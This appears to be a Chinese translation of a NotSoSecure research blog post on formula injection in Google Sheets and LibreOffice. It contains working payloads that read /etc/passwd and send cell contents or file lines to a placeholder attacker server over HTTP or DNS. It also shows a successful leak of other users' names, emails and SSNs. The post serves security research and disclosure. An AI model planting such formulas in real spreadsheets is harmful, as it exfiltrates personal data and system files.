# 通过公式注入从电子表格中泄露数据

#### 译文声明
本文是翻译文章，原文链接：[https://www.notsosecure.com/](https://www.notsosecure.com/)
译文仅供参考，具体内容及含义以原文为准。

## 前言
最近的客户端测试使我们对利用带外（OOB）方法从电子表格中提取数据产生了浓厚的兴趣。在本文中，我们将描述一种方法，该方法假设我们对电子表格的内容有一定控制权（尽管有限），但无法访问整个文档或客户端系统。我们主要研究了LibreOffice和Google Sheets，并为每个工具提供了几个概念验证（PoC）。特别地，我们关注非基于Windows的应用程序，因为这方面已有大量工作，我们不希望重复他们的努力。

在这篇博客文章中，我们将概述NotSoSecure团队成员Ajay（@9r4shar4j4y）和Balaji（@iambalaji7）的研究成果。以下PoC可能允许我们使用相对简单的内置功能来泄露潜在的敏感信息，甚至可以在各个客户端系统上读取文件内容。希望通过本文提醒您注意一些潜在的攻击途径。

让我们开始吧！

## Google Sheets中的OOB数据泄露
如果需要实时数据，基于云的数据捕获可能是最佳选择。与基于客户端的攻击不同，我们可以快速连续地在表单中填充数据并接收接近实时的响应。攻击场景会根据可利用的内容有所不同。如果您能够创建或上传CSV文件或其他类似文件到目标系统中，您可能会有更大的优势成功利用某些功能。

### 有趣的函数介绍
- **CONCATENATE**：将字符串互相追加。
  ```excel
  = CONCATENATE(A2:E2)
  ```
- **IMPORTXML**：从各种结构化数据类型（包括XML、HTML、CSV、TSV以及RSS和ATOM XML Feed）导入数据。
  ```excel
  = IMPORTXML(CONCAT("http://[remote IP:Port]/123.txt?v=", CONCATENATE(A2:E2)), "//a/a10")
  ```
- **IMPORTFEED**：导入RSS或ATOM。
  ```excel
  = IMPORTFEED(CONCAT("http://[remote IP:Port]/123.txt?v=", CONCATENATE(A2:E2)))
  ```
- **IMPORTHTML**：从HTML页面中的表或列表导入数据。
  ```excel
  = IMPORTHTML(CONCAT("http://[remote IP:Port]/123.txt?v=", CONCATENATE(A2:E2)), "table", 1)
  ```
- **IMPORTRANGE**：从指定的电子表格导入一系列单元格。
  ```excel
  = IMPORTRANGE("https://docs.google.com/spreadsheets/d/[Sheet_Id]", "sheet1!A2:E2")
  ```
- **IMAGE**：将图像插入单元格。
  ```excel
  = IMAGE("https://[remote IP:Port]/images/srpr/logo3w.png")
  ```

### 数据泄露案例
基于Google Sheets的功能，上述函数可能成为带外数据泄露的理想候选者。

#### 案例1 [失败]
我是一个诚实的人，因此在这里包括了一些失败的PoC。失败是学习过程的一部分，应该被视为宝贵的经验。如果没有失败，成功永远不会显得如此甜美😉

Google提供创建表单并接收回复的功能，稍后可以使用Google Sheets进行访问。我们试图通过在相应Google表单的评论部分提交恶意公式来利用这一功能。然而，Google对提交的响应进行了完整性检查，并自动在公式前添加撇号（'），阻止了公式的执行。

#### 案例2 [成功]
Google Sheets还提供了一些功能，允许我们从CSV、TSV、XLSX等不同文件格式导入数据。导入的数据可以使用新电子表格表示，也可以附加到现有表单中。对于我们的PoC，我们会将其附加到包含前一场景响应的工作表中，以便我们可以提取其他用户提交的数据。幸运的是，Google没有像在案例1中那样执行相同的检查。以下是具体步骤：

1. 创建一个带有负载（公式）的恶意CSV文件，该文件将连接A到D列的数据。然后，我们通过这些细节为攻击者服务器生成一个`out of band`请求。
2. 使用导入功能将CSV文件导入Google Sheets，并将数据附加到现有工作表中。
3. 一旦导入数据，我们的有效载荷就会执行，我们就可以在HTTP服务器上监听用户的详细信息，例如姓名、电子邮件和SSN数据。

## 在Linux环境中读取LibreOffice OS文件
本节重点介绍如何在Linux环境中利用CSV注入。许多博客已发布PoC和其他类似的工具，涉及利用Excel中的DDE，但很少涉及Linux环境中的办公应用程序。这是可以理解的，因为Linux桌面远不如Windows普及，并且我们知道，攻击总是会瞄准最广泛的、也是最赚钱的终端。

在本文中，我们想介绍一些简单但非常有趣的公式攻击，可以在Linux目标上利用。

有效载荷已在下列环境中成功测试：
- Ubuntu 16.04 LTS 和 LibreOffice 5.1.6.2
- Ubuntu 18.04 LTS 和 LibreOffice 6.0.3.2

### 本地文件读取
我们首先尝试通过公式读取敏感文件。LibreOffice提供使用“file”协议读取文件。初始的PoC从本地`/etc/passwd`文件中检索单个行，并在下面详细说明。

**Payload 1**：
```excel
='file:///etc/passwd'#$passwd.A1
```
分析上述payload：
- `'file:///etc/passwd'#$passwd.A1`：从本地`/etc/passwd`文件中读取第一行。

有趣的是，似乎还可以使用`http://`代替 `file:///`。需要注意的是，在初次导入时，系统会提示用户执行如下屏幕截图所示的操作（在本例中显示`/etc/group`的输出）。导入后，每当文档重新打开时，都会提示用户更新链接。

通过更改行参考（在本例中为A2），我们可以从文件中读取更多条目。

### 远程文件读取
我们需要一种方法来查看来自远程系统的文件内容。这导致我们需要查看`WEBSERVICE`功能。我们可以使用此函数连接到我们控制的远程系统，然后发送对从本地`/etc/passwd`文件中提取的数据的请求。显然，这些文件不会存在于攻击主机上，但GET请求将包含所有的信息，并且可以通过攻击主机上的日志或控制台输出。

**Payload 2**：
```excel
=WEBSERVICE(CONCATENATE("http://[remote IP:Port]/", ('file:///etc/passwd'#$passwd.A1)))
```
分析上述payload：
- `'file:///etc/passwd'#$passwd.A1`：从本地`/etc/passwd`文件中读取第一行。
- `CONCATENATE("http://[remote IP:Port]/", ('file:///etc/passwd'#$passwd.A1))`：连接IP地址并输出文件内容。
- `WEBSERVICE`：向我们的攻击主机发送针对给定URI的请求。

我们的攻击系统运行了Python的SimpleHTTPServer，当恶意文件在受害者系统上打开时，请求就会被我们的服务器接收并记录。

同样，我们创建了几个payload来读取目标文件。如果空间不是问题，只需确保最后一个引用（即`#$passwd.A1`）设置为每行增加一行，就可以通过在单个文档中嵌入多行来轻松实现此任务。以下PoC将提取并发送目标文件`/etc/passwd`中的前30行。

**Payload 3**：
```excel
=WEBSERVICE(CONCATENATE("http://[remote IP:Port]/", ('file:///etc/passwd'#$passwd.A1) & CHAR(36) & ('file:///etc/passwd'#$passwd.A2)))
```
分析上述payload：
- `'file:///etc/passwd'#$passwd.A1` 和 `'file:///etc/passwd'#$passwd.A2`：从本地`/etc/passwd`文件中读取第一行和第二行。
- `CONCATENATE("http://[remote IP:Port]/", ('file:///etc/passwd'#$passwd.A1) & CHAR(36) & ('file:///etc/passwd'#$passwd.A2))`：将攻击服务器IP地址与`/etc/passwd`文件的第1行和第2行的输出连接起来，每个行都用美元（$）字符分隔。
- `WEBSERVICE`：向我们的攻击主机发送针对给定URI的请求。

查看攻击主机，我们可以在GET请求中看到`/etc/passwd`中的相应条目，在这个实例中由$字符`（CHAR 36）`分隔。

根据文件内容的不同，我们可能会遇到URL长度的问题。我们在下一个PoC中解决了这些问题，并且没有强制性的DNS示例，要知道没有OOB数据泄露是完整的。

**Payload 4**：
```excel
=WEBSERVICE(CONCATENATE((SUBSTITUTE(MID((ENCODEURL('file:///etc/passwd'#$passwd.A19)), 1, 41), "%", "-")), "."))
```
分析上述payload：
- `'file:///etc/passwd'#$passwd.A19`：从本地`/etc/passwd`文件中读取第19行。
- `ENCODEURL('file:///etc/passwd'#$passwd.A19)`：对返回的数据进行URL编码。
- `MID((ENCODEURL('file:///etc/passwd'#$passwd.A19)), 1, 41)`：类似于子字符串，从第1个字符读取数据到第41个字符，这是一种方便的方式来限制DNS的长度。
- `SUBSTITUTE(MID((ENCODEURL('file:///etc/passwd'#$passwd.A19)), 1, 41), "%", "-")`：替换%（URL中的特殊字符编码）为破折号，确保只有有效的DNS字符被使用。
- `CONCATENATE((SUBSTITUTE(MID((ENCODEURL('file:///etc/passwd'#$passwd.A19)), 1, 41), "%", "-")), ".")`：将文件的输出（经过上述处理后）与FQDN连接起来。
- `WEBSERVICE`：将请求这个不存在的DNS名称，然后我们可以在我们控制的DNS权威名称服务器上解析日志（或运行tcpdump等）。

在发送此消息时，我们可以通过我们的服务器上的tcpdump来查看FQDN（包括来自`/etc/passwd`的第19行的编码数据）的查询，该服务器被配置为该域的权威服务器。